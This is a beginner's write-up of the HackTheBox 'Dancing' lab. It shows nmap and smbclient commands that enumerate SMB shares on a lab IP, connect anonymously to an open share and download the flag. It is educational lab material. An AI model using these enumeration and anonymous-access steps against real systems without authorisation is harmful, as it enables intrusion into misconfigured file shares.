# Dancing — HackTheBox Starting Point

**Difficulty:** Very Easy
**Tier:** 0
**Date:** April 2026

## Summary
Exploited an SMB service with anonymous access enabled
to enumerate shares and retrieve the flag.

## Enumeration
Started with an Nmap scan to identify open ports and services.

nmap -sV -sC 10.129.114.201

**Results:**
- Port 135/tcp open — msrpc
- Port 139/tcp open — netbios-ssn
- Port 445/tcp open — SMB (microsoft-ds)

Listed available SMB shares using smbclient.

smbclient -L 10.129.114.201

**Shares found:**
- ADMIN$
- C$
- IPC$
- WorkShares 

## Exploitation
Attempted to connect to each share with no password.
ADMIN$ and C$ denied. WorkShares allowed anonymous access.

smbclient \\\\10.129.114.201\\WorkShares

Connected successfully with no credentials.
Navigated directories and located the flag.

ls
cd James.P
ls
get flag.txt



## What I Learned
- What SMB is and how file sharing works on Windows networks
- How to enumerate SMB shares with smbclient
- Why misconfigured share permissions are a serious risk
- Anonymous SMB access as a common attack vector
- Basic SMB navigation commands (ls, cd, get)
